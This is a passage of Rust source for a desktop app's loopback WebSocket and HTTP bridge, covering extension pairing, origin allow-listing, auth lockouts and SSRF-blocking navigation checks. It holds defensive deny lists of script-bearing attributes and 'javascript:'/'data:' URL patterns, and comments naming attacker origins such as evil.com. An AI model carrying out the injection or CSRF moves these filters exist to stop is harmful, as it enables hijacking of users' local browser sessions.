use super::{PresenceManager, RealtimeEvent};
use crate::automation::browser::advanced::Cookie;
use crate::automation::browser::{AccessibilityAnalyzer, AdvancedBrowserOps, CdpClient};
use crate::automation::computer_use::ensure_navigation_url_allowed;
use crate::integrations::native_messaging::manifest::{
    install_manifests, is_valid_chrome_extension_id,
};
use crate::integrations::native_messaging::messages::{ExtensionCapabilities, NativeCapability};
use crate::integrations::native_messaging::{
    stage_selected_context_handoff, ConnectionState, NativeMessage,
};
use crate::sys::commands::BrowserStateWrapper;
use crate::ui::events::tool_stream::{emit_tool_completed, emit_tool_error, emit_tool_started};
use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
use futures::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr, ToSocketAddrs};
use std::sync::Arc;
use std::time::{Duration, Instant};
use subtle::ConstantTimeEq;
use tauri::Emitter;
use tauri::Manager;
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{Mutex as TokioMutex, RwLock as TokioRwLock, Semaphore};
use tokio_tungstenite::{
    accept_hdr_async_with_config,
    tungstenite::{
        handshake::server::{ErrorResponse, Request, Response},
        protocol::WebSocketConfig,
        Message,
    },
    WebSocketStream,
};

// SEV-DESK-01 limits ─────────────────────────────────────────────────────────
//
// The realtime server binds 127.0.0.1 and accepts ws+http upgrades from
// the Chrome extension, VS Code extension, and Tauri webview. Without these
// caps, any local process running as the same user (malware, bug-installer)
// could open thousands of unauthenticated connections to exhaust file
// descriptors / heap, or brute-force the IPC token.
//
// MAX_CONNECTIONS — total simultaneous accepted connections. Beyond this, the
//   accept loop drops new connections at the TCP level (no upgrade).
// MAX_AUTH_FAILURES / AUTH_FAILURE_WINDOW — within any 60s rolling window,
//   five auth failures from the same IP triggers a lockout.
// LOCKOUT_DURATION — duration the offending IP is rejected at handshake.
// MAX_WS_MESSAGE_SIZE — caps a single WS frame so a malicious / buggy peer
//   cannot force the server to buffer 64 MiB before validating.
const MAX_CONNECTIONS: usize = 32;
const MAX_AUTH_FAILURES: u32 = 5;
const AUTH_FAILURE_WINDOW: Duration = Duration::from_secs(60);
const LOCKOUT_DURATION: Duration = Duration::from_secs(300);
const MAX_WS_MESSAGE_SIZE: usize = 4 * 1024 * 1024;

// Bridge navigation policy ───────────────────────────────────────────────────
//
// A peer that presents the loopback token picks navigation targets the user
// never saw. `ensure_navigation_url_allowed` keeps every caller off non-http
// schemes; these decide the second half, which only binds automated targets:
// the browser must not be steered at anything that is not routable on the
// public internet, because the same socket can read the answer back.

/// The empty document a new tab is created on. It has no origin and no content.
const BLANK_DOCUMENT_URL: &str = "about:blank";

/// How long a hostname gets to resolve before the navigation is refused.
const BRIDGE_DNS_TIMEOUT: Duration = Duration::from_secs(2);

fn is_internal_ipv4(address: Ipv4Addr) -> bool {
    let [first, second, ..] = address.octets();
    address.is_loopback()
        || address.is_private()
        || address.is_link_local()
        || address.is_unspecified()
        || address.is_broadcast()
        || address.is_multicast()
        || first == 0
        || (first == 100 && (64..128).contains(&second))
        || (first == 192 && second == 0)
        || (first == 198 && (18..20).contains(&second))
}

fn is_internal_ipv6(address: Ipv6Addr) -> bool {
    if address.is_loopback() || address.is_unspecified() || address.is_multicast() {
        return true;
    }
    if let Some(mapped) = address.to_ipv4_mapped() {
        return is_internal_ipv4(mapped);
    }
    let segments = address.segments();
    // ::a.b.c.d and 64:ff9b::/96 both carry a v4 destination inside a v6
    // literal, so the v4 policy has to run on the address they carry.
    if segments[..6] == [0, 0, 0, 0, 0, 0] || (segments[0] == 0x64 && segments[1] == 0xff9b) {
        let octets = address.octets();
        return is_internal_ipv4(Ipv4Addr::new(
            octets[12], octets[13], octets[14], octets[15],
        ));
    }
    segments[0] & 0xfe00 == 0xfc00 || segments[0] & 0xffc0 == 0xfe80
}

fn is_internal_ip(address: &IpAddr) -> bool {
    match address {
        IpAddr::V4(v4) => is_internal_ipv4(*v4),
        IpAddr::V6(v6) => is_internal_ipv6(*v6),
    }
}

fn is_loopback_domain(host: &str) -> bool {
    let lowered = host.trim_end_matches('.').to_lowercase();
    lowered == "localhost" || lowered.ends_with(".localhost")
}

/// Resolve `host` on the blocking pool so a hung resolver occupies no runtime
/// worker. `None` means the answer never arrived, which the caller refuses.
async fn resolve_navigation_host(host: &str) -> Option<Vec<IpAddr>> {
    let query = format!("{host}:443");
    let lookup = tokio::task::spawn_blocking(move || {
        query
            .to_socket_addrs()
            .map(|addresses| addresses.map(|address| address.ip()).collect::<Vec<_>>())
            .ok()
    });
    tokio::time::timeout(BRIDGE_DNS_TIMEOUT, lookup)
        .await
        .ok()?
        .ok()?
}

#[derive(Default)]
struct AuthFailureRecord {
    /// First failure in the current window. Reset whenever the window expires.
    first_failure_at: Option<Instant>,
    /// Failures observed within the current window.
    count: u32,
    /// Lockout end-time. While `Some(t)` and `t > now`, all upgrades from
    /// this IP are rejected at the handshake.
    lockout_until: Option<Instant>,
}

#[derive(serde::Deserialize)]
struct PairRequestBody {
    #[serde(rename = "extensionId")]
    extension_id: Option<String>,
}

#[derive(serde::Deserialize)]
struct PairConfirmBody {
    #[serde(rename = "requestId")]
    request_id: Option<String>,
    code: Option<String>,
}

fn http_request_body(raw_request: &str) -> Result<&str, String> {
    let Some((headers, body)) = raw_request.split_once("\r\n\r\n") else {
        return Ok("");
    };

    let content_length = headers
        .lines()
        .find_map(|line| {
            let (name, value) = line.split_once(':')?;
            if name.eq_ignore_ascii_case("content-length") {
                value.trim().parse::<usize>().ok()
            } else {
                None
            }
        })
        .unwrap_or(0);

    if content_length == 0 || body.trim().is_empty() {
        return Ok("");
    }

    if body.len() < content_length {
        return Err("Pairing request body was truncated".to_string());
    }

    body.get(..content_length)
        .ok_or_else(|| "Pairing request body was not valid UTF-8".to_string())
}

fn parse_pair_extension_id(raw_request: &str) -> Result<Option<String>, String> {
    let body = http_request_body(raw_request)?;
    if body.is_empty() {
        return Ok(None);
    }

    let parsed: PairRequestBody =
        serde_json::from_str(body).map_err(|e| format!("Invalid pairing JSON: {}", e))?;

    let Some(extension_id) = parsed.extension_id.map(|value| value.trim().to_string()) else {
        return Ok(None);
    };

    if !is_valid_chrome_extension_id(&extension_id) {
        return Err("Invalid Chrome extension ID".to_string());
    }

    Ok(Some(extension_id))
}

// ── SEC-11 handshake: Desktop-displayed, user-confirmed short code ───────────
//
// `/pair/request` mints nothing and installs nothing. It parks a short code in
// memory and hands the caller only an opaque request id; the code is delivered
// exclusively to the Desktop's own UI. `/pair/confirm` requires that code back,
// so a caller that can reach the loopback port but cannot see the Desktop
// screen has no way to complete the handshake.

const PAIR_CODE_ALPHABET: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
const PAIR_CODE_LEN: usize = 8;
const PAIR_REQUEST_TTL: Duration = Duration::from_secs(120);
const MAX_PENDING_PAIR_REQUESTS: usize = 8;
const MAX_PAIR_CONFIRM_ATTEMPTS: u32 = 3;

struct PendingPairRequest {
    extension_id: String,
    code: String,
    created_at: Instant,
    failed_attempts: u32,
}

type PendingPairRequests = Arc<TokioMutex<HashMap<String, PendingPairRequest>>>;

#[derive(Clone)]
struct PairEndpointState {
    pair_token: Arc<TokioRwLock<String>>,
    bridge_token: Arc<TokioRwLock<String>>,
    pending: PendingPairRequests,
    app_handle: Option<tauri::AppHandle>,
}

#[derive(Clone, serde::Serialize)]
pub struct PairRequestPrompt {
    #[serde(rename = "requestId")]
    pub request_id: String,
    #[serde(rename = "extensionId")]
    pub extension_id: String,
    pub code: String,
    #[serde(rename = "expiresInMs")]
    pub expires_in_ms: u64,
}

fn random_hex(byte_len: usize) -> String {
    use rand::RngCore;
    let mut bytes = vec![0u8; byte_len];
    rand::thread_rng().fill_bytes(&mut bytes);
    hex::encode(bytes)
}

fn generate_pair_code() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; PAIR_CODE_LEN];
    rand::thread_rng().fill_bytes(&mut bytes);
    bytes
        .iter()
        .map(|byte| PAIR_CODE_ALPHABET[*byte as usize % PAIR_CODE_ALPHABET.len()] as char)
        .collect()
}

fn normalize_pair_code(raw: &str) -> String {
    raw.chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .map(|c| c.to_ascii_uppercase())
        .collect()
}

fn pair_code_matches(supplied: &str, expected: &str) -> bool {
    supplied.len() == expected.len() && bool::from(supplied.as_bytes().ct_eq(expected.as_bytes()))
}

fn drop_expired_pair_requests(pending: &mut HashMap<String, PendingPairRequest>, now: Instant) {
    pending.retain(|_, request| now.duration_since(request.created_at) < PAIR_REQUEST_TTL);
}

async fn open_pair_request(
    pending: &PendingPairRequests,
    extension_id: String,
) -> Result<PairRequestPrompt, String> {
    let mut requests = pending.lock().await;
    let now = Instant::now();
    drop_expired_pair_requests(&mut requests, now);

    if requests.len() >= MAX_PENDING_PAIR_REQUESTS {
        return Err("Too many pending pairing requests".to_string());
    }

    let request_id = random_hex(16);
    let code = generate_pair_code();
    requests.insert(
        request_id.clone(),
        PendingPairRequest {
            extension_id: extension_id.clone(),
            code: code.clone(),
            created_at: now,
            failed_attempts: 0,
        },
    );

    Ok(PairRequestPrompt {
        request_id,
        extension_id,
        code,
        expires_in_ms: PAIR_REQUEST_TTL.as_millis() as u64,
    })
}

async fn take_confirmed_pair_request(
    pending: &PendingPairRequests,
    request_id: &str,
    supplied_code: &str,
) -> Result<String, String> {
    let mut requests = pending.lock().await;
    drop_expired_pair_requests(&mut requests, Instant::now());

    let Some(request) = requests.get_mut(request_id) else {
        return Err("Unknown or expired pairing request".to_string());
    };

    if !pair_code_matches(&normalize_pair_code(supplied_code), &request.code) {
        request.failed_attempts += 1;
        let attempts_exhausted = request.failed_attempts >= MAX_PAIR_CONFIRM_ATTEMPTS;
        if attempts_exhausted {
            requests.remove(request_id);
        }
        return Err("Pairing code did not match".to_string());
    }

    Ok(requests
        .remove(request_id)
        .map(|request| request.extension_id)
        .unwrap_or_default())
}

fn request_header<'a>(raw_request: &'a str, header_name: &str) -> Option<&'a str> {
    let headers = raw_request
        .split_once("\r\n\r\n")
        .map(|(headers, _)| headers)
        .unwrap_or(raw_request);

    headers.lines().skip(1).find_map(|line| {
        let (name, value) = line.split_once(':')?;
        if name.eq_ignore_ascii_case(header_name) {
            Some(value.trim())
        } else {
            None
        }
    })
}

fn is_pair_manifest_install_authorized(raw_request: &str, local_bridge_secret: &str) -> bool {
    let Some(sent_token) = request_header(raw_request, "x-bridge-token") else {
        return false;
    };

    !local_bridge_secret.is_empty()
        && sent_token.len() == local_bridge_secret.len()
        && bool::from(sent_token.as_bytes().ct_eq(local_bridge_secret.as_bytes()))
}

// ── RT-04: WebSocket Origin allow-list ───────────────────────────────────────
//
// Any WebSocket from a non-allowed origin is rejected at the HTTP-upgrade
// phase, before any application data is exchanged.  Allowed origins:
//
//   • chrome-extension://...      — Chrome/Chromium extension (any ID)
//   • vscode-webview://...        — VS Code webview panel
//   • vscode-file://...           — VS Code file-based webview
//   • null                        — Tauri webview (no Origin header)
//   • http(s)://localhost[:port]  — localhost (dev tools, Electron)
//   • http(s)://127.0.0.1[:port]  — loopback IPv4
//   • http(s)://[::1][:port]      — loopback IPv6
//
// HTTP/HTTPS pages from arbitrary domains are always rejected.
//
// B3 fix: the previous implementation used `origin.starts_with("http://localhost")`
// which silently accepted `http://localhost.attacker.com`. We now require the
// host component (after the scheme + `://`) to *equal* one of the allowed
// values (modulo an optional `:port` suffix) so prefix attacks are closed.
fn is_origin_allowed(origin: Option<&str>) -> bool {
    let Some(origin) = origin else {
        // No Origin header — Tauri native webview; allow.
        return true;
    };
    if origin == "null" {
        // Tauri sends the literal string "null".
        return true;
    }
    if origin.starts_with("chrome-extension://")
        || origin.starts_with("vscode-webview://")
        || origin.starts_with("vscode-file://")
    {
        return true;
    }
    // For http(s) origins we must compare the *host* exactly, not the prefix.
    // Origin headers are of the form `http(s)://host[:port]` (no path / no query).
    let rest = origin
        .strip_prefix("http://")
        .or_else(|| origin.strip_prefix("https://"));
    let Some(rest) = rest else {
        return false;
    };
    // Strip optional :port. IPv6 origins are bracketed: `[::1]:8080` -> host `[::1]`.
    let host = if let Some(stripped) = rest.strip_prefix('[') {
        // IPv6: host runs through the closing ']'. `stripped` does NOT
        // include the leading `[`, so the `]` index in `stripped` is offset
        // by 1 relative to `rest` — and we want to keep BOTH brackets.
        match stripped.find(']') {
            Some(end) => &rest[..end + 2], // +1 for `[`, +1 for `]`
            None => return false,
        }
    } else {
        // IPv4 / DNS host: host runs until the first ':' or end.
        match rest.find(':') {
            Some(end) => &rest[..end],
            None => rest,
        }
    };
    matches!(host, "localhost" | "127.0.0.1" | "[::1]")
}

/// CLAUDE-SECURITY F2: a bridge peer's script body is the same untrusted
/// input the AGI and IPC paths screen, and the capability grant only says the
/// peer may run *a* script — not that this one is safe. Screening here makes
/// the content screen a property of the sink instead of a property of one
/// caller.
fn ensure_peer_script_allowed(script: &str) -> Result<(), String> {
    crate::sys::security::tool_guard::ToolExecutionGuard::screen_browser_script(script)
        .map_err(|reason| format!("Blocked browser script: it may not use {reason}"))
}

/// Attributes that run code or load a URL. `setAttribute('onmouseover', …)`
/// plus a dispatched event is script execution written without the word
/// `script`, and a URL attribute pointed off origin is the same exfiltration
/// the script screen refuses, so the peer may only write inert markup.
fn ensure_peer_attribute_write_allowed(attribute: &str, value: &str) -> Result<(), String> {
    const URL_BEARING_ATTRIBUTES: &[&str] = &[
        "src",
        "srcset",
        "href",
        "xlink:href",
        "action",
        "formaction",
        "data",
        "srcdoc",
        "poster",
        "background",
        "ping",
        "cite",
        "codebase",
        "longdesc",
        "manifest",
        "profile",
        "usemap",
        "style",
        "content",
    ];

    let name = attribute.trim().to_lowercase();
    if name.starts_with("on") {
        return Err(format!(
            "Blocked attribute write: '{name}' is an event handler, which runs script in the page."
        ));
    }
    if URL_BEARING_ATTRIBUTES.contains(&name.as_str()) {
        return Err(format!(
            "Blocked attribute write: '{name}' makes the page load a URL it was not asked to load."
        ));
    }

    let condensed: String = value
        .chars()
        .filter(|current| !current.is_whitespace())
        .collect::<String>()
        .to_lowercase();
    if condensed.contains("://")
        || condensed.contains("javascript:")
        || condensed.contains("data:")
        || condensed.contains("vbscript:")
        || condensed.starts_with("//")
        || condensed.contains('<')
    {
        return Err(
            "Blocked attribute write: the value carries a URL or markup the page would load."
                .to_string(),
        );
    }

    Ok(())
}

/// Duration the server waits for the first auth message before closing.
const AUTH_TIMEOUT: Duration = Duration::from_secs(2);
// ─────────────────────────────────────────────────────────────────────────────

pub struct WebSocketClient {
    pub id: String,
    pub user_id: Option<String>,
    pub team_id: Option<String>,
    /// The resource this client is currently interacting with (e.g. typing in)
    pub current_resource: Option<String>,
    /// Capabilities this connection negotiated at `connect`. Holding the bridge
    /// token authenticates a peer; it does not authorize the privileged native
    /// messages, so this starts empty and only a negotiation can raise it.
    pub capabilities: ExtensionCapabilities,
}

pub struct RealtimeServer {
    clients: Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
    senders: Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    presence: Arc<PresenceManager>,
    /// B6 fix: live IPC token guarded by an `Arc<RwLock<String>>` so
    /// `bridge_rotate_token` can swap the value at runtime and new
    /// connections immediately authenticate against the rotated value.
    /// Existing connections keep the snapshot they captured at handshake.
    token: Arc<TokioRwLock<String>>,
    app_handle: Option<tauri::AppHandle>,
    /// SEV-DESK-01: caps simultaneous accepted connections at MAX_CONNECTIONS.
    connection_semaphore: Arc<Semaphore>,
    /// SEV-DESK-01: per-source-IP auth-failure record; entries decay after
    /// AUTH_FAILURE_WINDOW elapses without further failures.
    auth_failures: Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
    /// E2 fix: token issued by POST /pair and stored for subsequent
    /// X-Bridge-Token validation. Empty string means no pairing has occurred.
    pair_token: Arc<TokioRwLock<String>>,
    pending_pair_requests: PendingPairRequests,
}

impl RealtimeServer {
    pub fn new(
        presence: Arc<PresenceManager>,
        token: Arc<TokioRwLock<String>>,
        app_handle: Option<tauri::AppHandle>,
    ) -> Self {
        Self {
            clients: Arc::new(TokioMutex::new(HashMap::new())),
            senders: Arc::new(TokioMutex::new(HashMap::new())),
            presence,
            token,
            app_handle,
            connection_semaphore: Arc::new(Semaphore::new(MAX_CONNECTIONS)),
            auth_failures: Arc::new(TokioMutex::new(HashMap::new())),
            pair_token: Arc::new(TokioRwLock::new(String::new())),
            pending_pair_requests: Arc::new(TokioMutex::new(HashMap::new())),
        }
    }

    /// Return the current pair token for X-Bridge-Token validation.
    /// Returns an empty string if no pairing has been performed yet.
    pub async fn get_pair_token(&self) -> String {
        self.pair_token.read().await.clone()
    }

    /// Pairing requests awaiting the user's confirmation, newest first. The
    /// short code is included: this is the Desktop UI's own read of the value
    /// it must display, and it is the only channel that ever carries the code.
    pub async fn pending_pair_requests(&self) -> Vec<PairRequestPrompt> {
        let mut requests = self.pending_pair_requests.lock().await;
        let now = Instant::now();
        drop_expired_pair_requests(&mut requests, now);

        let mut prompts: Vec<(Instant, PairRequestPrompt)> = requests
            .iter()
            .map(|(request_id, request)| {
                let remaining =
                    PAIR_REQUEST_TTL.saturating_sub(now.duration_since(request.created_at));
                (
                    request.created_at,
                    PairRequestPrompt {
                        request_id: request_id.clone(),
                        extension_id: request.extension_id.clone(),
                        code: request.code.clone(),
                        expires_in_ms: remaining.as_millis() as u64,
                    },
                )
            })
            .collect();
        prompts.sort_by(|a, b| b.0.cmp(&a.0));
        prompts.into_iter().map(|(_, prompt)| prompt).collect()
    }

    /// Drop a pending pairing request the user denied. Returns true if a
    /// request was actually removed.
    pub async fn cancel_pair_request(&self, request_id: &str) -> bool {
        self.pending_pair_requests
            .lock()
            .await
            .remove(request_id)
            .is_some()
    }

    /// Report whether an authenticated realtime client is connected for the
    /// exact protocol user id. Used by bridge diagnostics; listening on the
    /// port alone is not evidence that the VS Code extension connected.
    pub async fn has_authenticated_user(&self, user_id: &str) -> bool {
        self.clients
            .lock()
            .await
            .values()
            .any(|client| client.user_id.as_deref() == Some(user_id))
    }

    /// SEV-DESK-01: returns true if `ip` is currently in the lockout window.
    /// Also opportunistically clears expired lockouts so the map does not
    /// grow without bound for transient offenders.
    async fn is_locked_out(
        map: &Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
        ip: IpAddr,
    ) -> bool {
        let mut failures = map.lock().await;
        let Some(rec) = failures.get_mut(&ip) else {
            return false;
        };
        if let Some(until) = rec.lockout_until {
            if Instant::now() < until {
                return true;
            }
            tracing::info!(
                "SEV-DESK-01: auth lockout expired for IP {} (was locked for {}s)",
                ip,
                LOCKOUT_DURATION.as_secs()
            );
            rec.lockout_until = None;
            rec.count = 0;
            rec.first_failure_at = None;
        }
        false
    }

    /// SEV-DESK-01: records an auth failure for `ip` and applies the lockout
    /// rule. Returns true iff the failure caused a new lockout.
    async fn record_auth_failure(
        map: &Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
        ip: IpAddr,
    ) -> bool {
        let mut failures = map.lock().await;
        let now = Instant::now();
        let rec = failures.entry(ip).or_default();

        // Reset the rolling window if the prior burst expired without
        // crossing the threshold.
        if let Some(start) = rec.first_failure_at {
            if now.duration_since(start) > AUTH_FAILURE_WINDOW {
                rec.count = 0;
                rec.first_failure_at = None;
            }
        }

        if rec.first_failure_at.is_none() {
            rec.first_failure_at = Some(now);
        }
        rec.count = rec.count.saturating_add(1);

        if rec.count >= MAX_AUTH_FAILURES {
            rec.lockout_until = Some(now + LOCKOUT_DURATION);
            tracing::warn!(
                "SEV-DESK-01: locking out {} for {}s after {} auth failures",
                ip,
                LOCKOUT_DURATION.as_secs(),
                rec.count
            );
            return true;
        }
        false
    }

    /// SEV-DESK-01: clears any failure record for `ip` after a successful auth.
    async fn clear_auth_failures(
        map: &Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
        ip: IpAddr,
    ) {
        let mut failures = map.lock().await;
        failures.remove(&ip);
    }

    pub async fn disconnect_all_clients(&self) {
        let ids: Vec<String> = {
            let clients = self.clients.lock().await;
            clients.keys().cloned().collect()
        };
        let count = ids.len();
        if count == 0 {
            return;
        }
        {
            let mut senders = self.senders.lock().await;
            for id in &ids {
                if let Some(mut sender) = senders.remove(id) {
                    let _ = futures::SinkExt::close(&mut sender).await;
                }
            }
        }
        {
            let mut clients = self.clients.lock().await;
            for id in &ids {
                clients.remove(id);
            }
        }
        tracing::info!(
            "Token rotation: disconnected {} authenticated client(s)",
            count
        );
    }

    pub async fn broadcast_to_user(
        &self,
        user_id: &str,
        event: RealtimeEvent,
    ) -> Result<(), String> {
        Self::broadcast_to_specific_user(user_id, event, &self.clients, &self.senders).await
    }

    pub async fn start(&self, port: u16) -> Result<(), Box<dyn std::error::Error>> {
        let addr = format!("127.0.0.1:{}", port);
        let listener = TcpListener::bind(&addr).await?;

        tracing::info!(
            "WebSocket server listening on {} (max {} concurrent connections)",
            addr,
            MAX_CONNECTIONS
        );

        loop {
            match listener.accept().await {
                Ok((stream, peer)) => {
                    // SEV-DESK-01: cap simultaneous connections. `try_acquire_owned`
                    // is non-blocking — when the cap is reached we drop the
                    // connection at the TCP layer rather than queue it (queueing
                    // would still consume the FD and let an attacker hold it
                    // indefinitely).
                    let permit = match self.connection_semaphore.clone().try_acquire_owned() {
                        Ok(permit) => permit,
                        Err(_) => {
                            tracing::warn!(
                                "SEV-DESK-01: rejecting connection from {} — connection cap of {} reached",
                                peer,
                                MAX_CONNECTIONS
                            );
                            // Dropping `stream` closes the TCP socket cleanly.
                            drop(stream);
                            continue;
                        }
                    };

                    // SEV-DESK-01: skip handshake entirely for IPs in lockout.
                    if Self::is_locked_out(&self.auth_failures, peer.ip()).await {
                        tracing::warn!(
                            "SEV-DESK-01: rejecting connection from locked-out IP {}",
                            peer
                        );
                        drop(stream);
                        drop(permit);
                        continue;
                    }

                    // E2 fix: dual-protocol dispatch. Peek the first 8 bytes to
                    // distinguish a plain HTTP request (POST /pair) from a WebSocket
                    // upgrade (begins with "GET "). The peek does NOT consume bytes,
                    // so the WS upgrade path sees a pristine stream.
                    let mut peek_buf = [0u8; 8];
                    let peek_len = match stream.peek(&mut peek_buf).await {
                        Ok(n) => n,
                        Err(e) => {
                            tracing::debug!("Peek failed on new connection from {}: {}", peer, e);
                            drop(stream);
                            drop(permit);
                            continue;
                        }
                    };

                    let is_plain_http = peek_len >= 5 && &peek_buf[..5] == b"POST "; // utf8-safe: [u8] not &str

                    let clients = self.clients.clone();
                    let senders = self.senders.clone();
                    let presence = self.presence.clone();
                    // B6 fix: snapshot the live token at spawn time. Connections
                    // authenticate against whatever value `bridge_rotate_token`
                    // last wrote; in-flight handshakes captured at this point
                    // keep their snapshot for the duration of the handshake.
                    let token = self.token.read().await.clone();
                    let app_handle = self.app_handle.clone();
                    let auth_failures = self.auth_failures.clone();
                    let pair_endpoint = PairEndpointState {
                        pair_token: self.pair_token.clone(),
                        bridge_token: self.token.clone(),
                        pending: self.pending_pair_requests.clone(),
                        app_handle: self.app_handle.clone(),
                    };

                    tokio::spawn(async move {
                        // The permit is held for the entire connection lifetime;
                        // drop on task exit releases it for the next connection.
                        let _permit = permit;

                        if is_plain_http {
                            // Route plain HTTP POST /pair* to the pairing handler.
                            Self::handle_http_pair(stream, peer, pair_endpoint).await;
                        } else if let Err(e) = Self::handle_connection_wrapper(
                            stream,
                            peer,
                            clients,
                            senders,
                            presence,
                            token,
                            app_handle,
                            auth_failures,
                        )
                        .await
                        {
                            tracing::error!("Connection error: {}", e);
                        }
                    });
                }
                Err(e) => {
                    tracing::error!("Failed to accept connection: {}", e);
                }
            }
        }
    }

    // ── E2: HTTP /pair handler ────────────────────────────────────────────────
    //
    // Accepts POST /pair from loopback only. Reads the minimal HTTP/1.1 framing
    // (headers until \r\n\r\n, then Content-Length body bytes), validates the
    // path, generates a 32-byte random token, stores it in the shared pair_token
    // lock, and returns {"token":"…","fingerprint":"…"} as JSON.
    //
    // If the request asks to install/refresh a native messaging manifest for
    // an extension ID, it must include X-Bridge-Token matching the desktop
    // bridge secret (the `.ipc_token` value, readable only through the Tauri
    // UI or the 0600 file). SEC-11: the pair token this endpoint mints must
    // never authorize the install — a caller could obtain one by posting an
    // empty body, making the credential self-issuing and letting any local
    // page or process add an attacker-controlled extension ID to the native
    // host manifest.
    //
    // Calling /pair a second time ROTATES the token (idempotent success, new value).
    // Non-loopback source IPs and wrong paths both receive 403 / 404 respectively.

    async fn handle_http_pair(stream: TcpStream, peer: SocketAddr, state: PairEndpointState) {
        Self::handle_http_pair_with(stream, peer, state, |extension_id| {
            install_manifests(extension_id)
                .map(|paths| paths.len())
                .map_err(|error| error.to_string())
        })
        .await
    }

    async fn write_http(stream: &mut TcpStream, status: &str, content_type: &str, body: &str) {
        let response = format!(
            "HTTP/1.1 {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            status,
            content_type,
            body.len(),
            body
        );
        let _ = stream.write_all(response.as_bytes()).await;
        let _ = stream.shutdown().await;
    }

    async fn write_http_json(stream: &mut TcpStream, status: &str, body: &str) {
        let response = format!(
            "HTTP/1.1 {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n{}",
            status,
            body.len(),
            body
        );
        let _ = stream.write_all(response.as_bytes()).await;
        let _ = stream.shutdown().await;
    }

    async fn handle_http_pair_with<F>(
        mut stream: TcpStream,
        peer: SocketAddr,
        state: PairEndpointState,
        install: F,
    ) where
        F: Fn(Option<&str>) -> Result<usize, String>,
    {
        use tokio::io::AsyncReadExt;

        // Loopback-only: reject any non-127.0.0.1 source immediately.
        if !peer.ip().is_loopback() {
            tracing::warn!("E2: /pair rejected from non-loopback source {}", peer);
            Self::write_http(&mut stream, "403 Forbidden", "text/plain", "Forbidden").await;
            return;
        }

        // Read up to 4 KiB — enough for any real HTTP /pair request.
        let mut buf = vec![0u8; 4096];
        let n = match stream.read(&mut buf).await {
            Ok(0) | Err(_) => return,
            Ok(n) => n,
        };
        let raw = &buf[..n];

        // Parse the request line (first line) to validate method + path.
        let header_section = match std::str::from_utf8(raw) {
            Ok(s) => s,
            Err(_) => {
                Self::write_http(&mut stream, "400 Bad Request", "text/plain", "Bad Request").await;
                return;
            }
        };

        let first_line = header_section.lines().next().unwrap_or("");
        let parts: Vec<&str> = first_line.splitn(3, ' ').collect();
        let method = parts.first().copied().unwrap_or("");
        let path = parts.get(1).copied().unwrap_or("");
        let path_no_query = path.split('?').next().unwrap_or(path);

        let is_known_route = matches!(path_no_query, "/pair" | "/pair/request" | "/pair/confirm");
        if method != "POST" || !is_known_route {
            let body = format!("Not found: {} {}", method, path_no_query);
            Self::write_http(&mut stream, "404 Not Found", "text/plain", &body).await;
            return;
        }

        // CSRF guard: reject cross-site Origins. Loopback-only is NOT enough — the
        // browser is on loopback, so any web page can fetch() this port. A legit
        // pairing request comes from an extension (chrome-extension://,
        // vscode-webview://) or a native client (no Origin / "null"); a normal web
        // origin (https://evil.com) must not be able to rotate or read the pair token.
        let origin = header_section.lines().find_map(|line| {
            let (name, value) = line.split_once(':')?;
            if name.trim().eq_ignore_ascii_case("origin") {
                Some(value.trim())
            } else {
                None
            }
        });
        if !is_origin_allowed(origin) {
            tracing::warn!("E2: /pair rejected — disallowed Origin {:?}", origin);
            Self::write_http(&mut stream, "403 Forbidden", "text/plain", "Forbidden").await;
            return;
        }

        match path_no_query {
            "/pair/request" => {
                Self::handle_pair_request_route(&mut stream, header_section, &state).await
            }
            "/pair/confirm" => {
                Self::handle_pair_confirm_route(&mut stream, header_section, &state, install).await
            }
            _ => Self::handle_pair_legacy_route(&mut stream, header_section, &state, install).await,
        }
    }

    async fn handle_pair_request_route(
        stream: &mut TcpStream,
        header_section: &str,
        state: &PairEndpointState,
    ) {
        let extension_id = match parse_pair_extension_id(header_section) {
            Ok(Some(extension_id)) => extension_id,
            Ok(None) => {
                Self::write_http(
                    stream,
                    "400 Bad Request",
                    "text/plain",
                    "extensionId is required",
                )
                .await;
                return;
            }
            Err(error) => {
                Self::write_http(stream, "400 Bad Request", "text/plain", &error).await;
                return;
            }
        };

        let prompt = match open_pair_request(&state.pending, extension_id).await {
            Ok(prompt) => prompt,
            Err(error) => {
                Self::write_http(stream, "429 Too Many Requests", "text/plain", &error).await;
                return;
            }
        };

        if let Some(app_handle) = state.app_handle.as_ref() {
            let _ = app_handle.emit("bridge:pair-request", &prompt);
        }

        tracing::info!(
            "SEC-11: /pair/request parked a confirmation code for extension {} (request {})",
            prompt.extension_id,
            prompt.request_id
        );

        // The code is deliberately absent: it reaches the user through the
        // Desktop UI only, so reaching this port is not enough to pair.
        let body = serde_json::json!({
            "requestId": prompt.request_id,
            "expiresInMs": prompt.expires_in_ms,
            "codeLength": PAIR_CODE_LEN,
        })
        .to_string();
        Self::write_http_json(stream, "200 OK", &body).await;
    }

    async fn handle_pair_confirm_route<F>(
        stream: &mut TcpStream,
        header_section: &str,
        state: &PairEndpointState,
        install: F,
    ) where
        F: Fn(Option<&str>) -> Result<usize, String>,
    {
        let body = match http_request_body(header_section) {
            Ok(body) => body,
            Err(error) => {
                Self::write_http(stream, "400 Bad Request", "text/plain", &error).await;
                return;
            }
        };

        let parsed: PairConfirmBody = match serde_json::from_str(body) {
            Ok(parsed) => parsed,
            Err(error) => {
                let message = format!("Invalid pairing JSON: {}", error);
                Self::write_http(stream, "400 Bad Request", "text/plain", &message).await;
                return;
            }
        };

